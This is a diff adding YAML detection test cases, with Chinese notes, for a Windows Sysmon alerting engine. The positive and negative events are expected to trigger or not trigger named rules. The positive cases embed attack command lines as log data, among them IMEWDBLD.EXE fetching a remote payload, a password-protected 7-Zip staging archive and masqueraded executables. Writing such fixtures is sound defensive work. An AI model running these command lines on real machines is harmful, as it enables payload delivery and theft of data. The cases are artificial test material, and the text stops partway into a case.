@@ -1,0 +1,1417 @@
+family: Windows Sysmon（进程与命令行事件，XML 导出）
+description: |
+  正样本覆盖 windows.lolbin_download、windows.suspicious_executable_in_temp、
+  windows.archive_with_password、windows.script_interpreter_encoded（编码命令）、
+  windows.command_shell_suspicious_parent（文档/压缩包启动 cmd）；
+  其中一条命令行含未转义的裸 `&`，用于验证 XML 修复后该事件不会被整体丢弃。
+  负样本验证常规目录进程、不带密码参数的压缩、明文 `-File` 的运维脚本、
+  explorer 启动的 cmd 与普通外联均不告警。
+cases:
+  - name: sysmon-lolbin-payload-download
+    note: mshta 父子链调用 IMEWDBLD.EXE 下载远程载荷 → 系统工具载荷下载
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:01:16.4092700Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE</Data>
+          <Data Name="CommandLine">"C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE" http://news.axonbyte.org:8000/captcha_privacy.epub</Data>
+          <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.lolbin_download
+        risk: high
+        count: 1
+    forbid: [windows.suspicious_executable_in_temp, windows.archive_with_password]
+
+  - name: sysmon-execution-from-inetcache
+    note: 命令行含未转义 `&`，缓存目录执行 → 临时目录执行规则命中且事件未被 XML 解析丢弃
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:01:18.3173653Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data>
+          <Data Name="CommandLine">for /f %i in ('dir /b *.epub') do (start "" "%i" & exit)</Data>
+          <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.suspicious_executable_in_temp
+        risk: medium
+        count: 1
+      - rule: windows.masquerade_extension
+        risk: high
+        count: 1
+    forbid: [windows.lolbin_download, windows.archive_with_password]
+
+  - name: sysmon-password-protected-archive
+    note: 7-Zip 使用 -p 与 AES256 打包 → 使用密码压缩打包数据
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:02:05.7444180Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Program Files\7-Zip\7z.exe</Data>
+          <Data Name="CommandLine">"C:\Program Files\7-Zip\7z.exe" a -tzip -pcc9441e5-1c80-4287-9c7a-4c03215c0969WK001 -mem=AES256 C:\Users\a.smith\AppData\Local\Temp\101010245WK001_protected.zip C:\Users\a.smith\AppData\Local\Temp\101010245WK001.zip</Data>
+          <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.archive_with_password
+        risk: medium
+        count: 1
+    forbid: [windows.lolbin_download, windows.suspicious_executable_in_temp]
+
+  - name: sysmon-normal-processes-negative
+    note: 系统目录进程、不带密码参数的压缩与外联 → 不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T10:00:00.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\explorer.exe</Data>
+          <Data Name="CommandLine">C:\Windows\explorer.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T10:01:00.2000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Program Files\7-Zip\7z.exe</Data>
+          <Data Name="CommandLine">"C:\Program Files\7-Zip\7z.exe" a -tzip C:\Users\a.smith\Documents\archive.zip C:\Users\a.smith\Documents\report</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>3</EventID>
+          <TimeCreated SystemTime="2025-08-05T10:02:00.3000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+          <Data Name="DestinationIp">10.0.0.5</Data>
+          <Data Name="DestinationPort">443</Data>
+          <Data Name="Protocol">tcp</Data>
+          <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+        </EventData>
+      </Event>
+    expect: []
+    forbid: []
+
+  - name: sysmon-credential-file-operation
+    note: 浏览器凭据文件被删除（EID 23）→ 凭据文件访问或清理
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>23</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:02:05.7278810Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data>
+          <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\Chrome\Default\passwords.txt</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.credential_file_access
+        risk: high
+        count: 1
+    forbid: [windows.payload_cleanup, windows.discovery_command]
+
+  - name: sysmon-payload-self-delete
+    note: 临时目录中的可执行文件被删除（EID 23）→ 落地程序删除
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>23</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:02:05.7311200Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data>
+          <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.payload_cleanup
+        risk: medium
+        count: 1
+    forbid: [windows.credential_file_access, windows.masquerade_extension]
+
+  - name: sysmon-registry-certificate-store
+    note: 写入证书策略注册表（EID 12）→ 证书策略注册表写入
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>12</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:01:59.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data>
+          <Data Name="EventType">CreateKey</Data>
+          <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft\SystemCertificates</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.registry_certificate_store
+        risk: medium
+        count: 1
+    forbid: [windows.credential_file_access, windows.payload_cleanup]
+
+  - name: sysmon-random-domain-dns
+    note: 随机字符串域名 DNS 查询（EID 22）→ 可疑域名解析
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>22</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:01:21.4781000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data>
+          <Data Name="QueryName">qqqqqqqqqqqqqqqq.org</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.suspicious_dns_query
+        risk: medium
+        count: 1
+    forbid: [windows.masquerade_extension, windows.discovery_command]
+
+  - name: sysmon-repeated-discovery-command
+    note: 5 秒内反复执行 hostname（EID 1 ×3）→ 主机信息发现命令反复执行
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:02:05.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data>
+          <Data Name="CommandLine">"hostname"</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:02:06.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data>
+          <Data Name="CommandLine">"hostname"</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T09:02:07.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data>
+          <Data Name="CommandLine">"hostname"</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+    expect:
+      - rule: windows.discovery_command
+        risk: low
+        count: 3
+    forbid: [windows.masquerade_extension, windows.suspicious_executable_in_temp]
+
+  - name: sysmon-payload-outbound-connection
+    note: 缓存目录中的程序发起网络连接（EID 3）→ 落地程序外联
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>3</EventID><TimeCreated SystemTime="2025-08-05T09:02:02.5000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data><Data Name="DestinationIp">145.1.0.92</Data><Data Name="DestinationPort">8000</Data><Data Name="Protocol">tcp</Data><Data Name="User">MEGACORPONE\a.smith</Data></EventData></Event>
+    expect:
+      - rule: windows.payload_outbound_connection
+        risk: high
+        count: 1
+    forbid: [windows.executable_drop_in_temp, windows.registry_bulk_write]
+
+  - name: sysmon-executable-drop-in-temp
+    note: 可执行文件被写入临时目录（EID 11）→ 可执行文件落地
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>11</EventID><TimeCreated SystemTime="2025-08-05T09:01:16.9000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE</Data><Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="User">MEGACORPONE\a.smith</Data></EventData></Event>
+    expect:
+      - rule: windows.executable_drop_in_temp
+        risk: medium
+        count: 1
+    forbid: [windows.payload_outbound_connection, windows.payload_cleanup]
+
+  - name: sysmon-registry-bulk-write
+    note: 用户可写目录进程 1 秒内写入 10 条注册表键（EID 12 ×10）→ 批量注册表写入
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:01:59.1000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key01</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:01:59.2000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key02</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:01:59.3000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key03</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:01:59.4000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key04</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:01:59.5000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key05</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:01:59.6000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key06</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:01:59.7000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key07</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:01:59.8000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key08</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:01:59.9000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key09</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T09:02:00.0000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Vendor\Run\Key10</Data></EventData></Event>
+    expect:
+      - rule: windows.registry_bulk_write
+        risk: low
+        count: 10
+    forbid: [windows.registry_certificate_store, windows.executable_drop_in_temp]
+
+  - name: sysmon-benign-administration-negative
+    note: |
+      正常注册表写入、系统进程由程序路径写入 10 条注册表键、系统进程正常外联、
+      临时目录写入 .zip、正常域名解析、单次 hostname、文档删除 → 均不告警
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>12</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:00:00.1000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+          <Data Name="EventType">CreateKey</Data>
+          <Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>22</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:01:00.2000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Program Files\Mozilla Firefox\firefox.exe</Data>
+          <Data Name="QueryName">www.microsoft.com</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:02:00.3000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data>
+          <Data Name="CommandLine">"hostname"</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>23</EventID>
+          <TimeCreated SystemTime="2025-08-05T11:03:00.4000000Z" />
+          <Computer>WK001.megacorpone.com</Computer>
+        </System>
+        <EventData>
+          <Data Name="Image">C:\Program Files\7-Zip\7z.exe</Data>
+          <Data Name="TargetFilename">C:\Users\a.smith\Documents\archive.zip</Data>
+          <Data Name="User">MEGACORPONE\a.smith</Data>
+        </EventData>
+      </Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:00.1000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting01</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:00.2000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting02</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:00.3000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting03</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:00.4000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting04</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:00.5000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting05</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:00.6000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting06</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:00.7000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting07</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:00.8000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting08</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:00.9000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting09</Data></EventData></Event>
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>12</EventID><TimeCreated SystemTime="2025-08-05T11:10:01.0000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\msiexec.exe</Data><Data Name="EventType">CreateKey</Data><Data Name="TargetObject">\REGISTRY\MACHINE\SOFTWARE\Vendor\App\Setting10</Data></EventData></Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>3</EventID><TimeCreated SystemTime="2025-08-05T11:11:00.1000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Windows\System32\svchost.exe</Data><Data Name="DestinationIp">20.99.184.37</Data><Data Name="DestinationPort">443</Data><Data Name="Protocol">tcp</Data></EventData></Event>
+
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /><EventID>11</EventID><TimeCreated SystemTime="2025-08-05T11:12:00.2000000Z" /><Computer>WK001.megacorpone.com</Computer></System><EventData><Data Name="Image">C:\Program Files\7-Zip\7z.exe</Data><Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\report.zip</Data></EventData></Event>
+    expect: []
+    forbid: []
+
+  - name: sysmon-encoded-command-execution
+    note: PowerShell 带 -EncodedCommand（父进程为 Word）→ 脚本解释器执行编码或隐藏命令
+    file: Sysmon.xml
+    log: |
+      <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+        <System>
+          <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+          <EventID>1</EventID>
